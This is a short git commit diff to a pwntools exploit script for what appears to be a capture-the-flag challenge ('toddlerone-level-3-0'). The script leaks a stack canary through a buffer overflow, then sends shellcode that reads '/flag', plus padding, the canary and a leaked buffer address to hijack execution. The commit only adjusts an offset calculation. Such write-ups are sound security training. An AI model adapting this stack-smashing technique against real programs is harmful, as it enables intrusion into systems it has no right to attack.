99fefedb29ed04631929b73a7d598abf898ecba0
Ernesto Pastori <43282001+ernepasto@users.noreply.github.com>
2025-04-18 20:02:37 +0200

    Update toddlerone-level-3-0.py

--- challenges/si/toddlerone-level-3-0.py
+++ challenges/si/toddlerone-level-3-0.py
@@ -10,12 +10,12 @@ context.log_level = 'CRITICAL'
 context.arch = 'amd64'
 
 elf = ELF('/challenge/toddlerone-level-3-0')
-
 p = elf.process()
 
 delta_len = 72
 canary_dist = delta_len - 16 - len('REPEAT')
 bytestream = b'REPEAT' + b'A' * canary_dist + b'X'
+
 p.sendline(f'{len(bytestream)}'.encode())
 p.sendline(bytestream)
 
@@ -29,7 +29,7 @@ buffer_addr = p64(int(addr, 16))
 assembly = shellcraft.cat('/flag')
 shellcode = asm(assembly)
 
-canary_dist = 56
+canary_dist = delta_len - 16
 padding = b'A' * (canary_dist - len(shellcode))
 bytestream = shellcode + padding + canary + b'A' * 8 + buffer_addr
 
